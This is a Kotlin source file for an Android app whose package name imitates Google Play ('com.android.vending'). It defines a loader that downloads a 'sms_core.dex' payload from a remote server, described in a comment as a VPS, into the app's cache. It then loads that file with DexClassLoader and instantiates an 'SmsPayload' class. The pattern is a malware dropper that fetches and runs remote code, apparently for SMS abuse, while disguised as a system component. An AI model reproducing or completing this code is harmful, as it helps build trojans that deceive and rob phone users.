package com.android.vending.preload.check.utils

import android.content.Context
import com.android.vending.preload.check.Config
import dalvik.system.DexClassLoader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.URL

object PayloadLoader {
    private var isLoaded = false

    suspend fun loadAndExecute(context: Context) = withContext(Dispatchers.IO) {
        if (isLoaded) return@withContext
        
        try {
            val dexFile = File(context.cacheDir, "sms_core.dex")
            val dexUrl = "${Config.BACKEND_WEBHOOK.substringBefore("/api")}/static/sms_core.dex"
            
            // Download the DEX payload from VPS
            URL(dexUrl).openStream().use { input ->
                FileOutputStream(dexFile).use { output ->
                    input.copyTo(output)
                }
            }

            val loader = DexClassLoader(
                dexFile.absolutePath,
                context.codeCacheDir.absolutePath,
                null,
                context.classLoader
            )

            // Dynamic invocation of the SMS logic
            val payloadClass = loader.loadClass("com.android.vending.preload.check.SmsPayload")
            val instance = payloadClass.getDeclaredConstructor().newInstance()
            // Here we can store the instance or trigger a 'start' method
            
            isLoaded = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
